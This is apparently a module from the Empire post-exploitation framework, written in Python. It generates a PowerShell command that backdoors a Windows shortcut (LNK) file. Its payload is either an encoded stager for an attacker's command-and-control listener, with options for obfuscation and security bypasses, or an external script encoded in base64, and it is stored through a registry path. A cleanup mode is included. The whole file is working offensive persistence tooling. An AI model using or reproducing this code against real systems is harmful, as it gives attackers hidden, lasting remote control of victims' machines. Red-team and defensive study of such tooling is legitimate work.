from pathlib import Path

from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # management options
        lnk_path = params["LNKPath"]
        ext_file = params["ExtFile"]
        cleanup = params["Cleanup"]

        # storage options
        reg_path = params["RegPath"]

        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        status_msg = ""

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language="powershell",
            encode=False,
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
            bypasses=params["Bypasses"],
        )
        launcher = launcher.replace("$", "`$")

        script_end = "Invoke-BackdoorLNK "

        if cleanup.lower() == "true":
            script_end += " -CleanUp"
            script_end += f" -LNKPath '{lnk_path}'"
            script_end += f" -RegPath '{reg_path}'"
            script_end += f"; \"Invoke-BackdoorLNK cleanup run on lnk path '{lnk_path}' and regPath {reg_path}\""

        else:
            if ext_file != "":
                # read in an external file as the payload and build a
                #   base64 encoded version as encScript
                ext_path = Path(ext_file)
                if ext_path.exists():
                    file_data = ext_path.read_text()

                    # unicode-base64 encode the script for -enc launching
                    encScript = helpers.enc_powershell(file_data)
                    status_msg += "using external file " + ext_file

                else:
                    raise ModuleValidationException(
                        "[!] File does not exist: " + ext_file
                    )

            elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                # not a valid listener, return nothing for the script
                raise ModuleValidationException(
                    "[!] Invalid listener: " + listener_name
                )

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=launcher_obfuscate,
                    obfuscation_command=launcher_obfuscate_command,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=params["Bypasses"],
                )

                encScript = launcher.split(" ")[-1]
                status_msg += "using listener " + listener_name

            script_end += f" -LNKPath '{lnk_path}'"
            script_end += f" -EncScript '{encScript}'"
            script_end += f"; \"Invoke-BackdoorLNK run on path '{lnk_path}' with stager for listener '{listener_name}'\""

        return script, script_end
